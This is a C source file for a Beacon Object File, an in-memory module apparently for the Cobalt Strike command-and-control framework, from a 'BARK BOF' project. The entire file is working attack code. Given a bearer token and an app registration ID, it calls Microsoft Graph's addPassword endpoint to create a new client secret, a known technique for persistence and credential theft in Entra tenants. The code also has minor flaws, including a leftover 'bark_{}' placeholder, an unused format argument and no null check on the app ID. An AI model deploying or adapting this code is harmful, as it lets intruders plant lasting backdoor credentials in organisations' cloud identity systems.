/*
 * new_entra_app_secret.c — BARK BOF
 * New-EntraAppSecret — Create a new secret for an app registration
 *
 * Args : token, appRegObjectId
 *
 * Author : BARK BOF project
 * License: GPLv3
 */
#include <windows.h>
#include <winhttp.h>
#include "../../include/beacon.h"
#include "../../include/http_utils.h"

void go(char *args, int alen)
{
    datap  parser;
    static char pathBuf[2048];
    static char bodyBuf[4096];
    LPWSTR widePath = NULL;
    char  *token = NULL;
    char  *appRegObjectId = NULL;
    BeaconDataParse(&parser, args, alen);
    token = BeaconDataExtract(&parser, NULL);
    appRegObjectId = BeaconDataExtract(&parser, NULL);
    if (!token || MSVCRT$strlen(token) == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[-] Usage: bark_{}" "\n", "<token> <appRegObjectId>");
        return;
    }
    MSVCRT$sprintf_s(bodyBuf, sizeof(bodyBuf), "{\"displayName\":\"BARK-BOF-Secret\"}", appRegObjectId);
    MSVCRT$sprintf_s(pathBuf, sizeof(pathBuf), "/v1.0/applications/%s/addPassword", appRegObjectId);
    widePath = MbsToWcs(pathBuf);
    if (!widePath) { BeaconPrintf(CALLBACK_ERROR, "[-] Path conversion failed\n"); return; }
    BarkPost(L"graph.microsoft.com", widePath, L"POST", bodyBuf, token, "application/json");
    HFree(widePath);
}
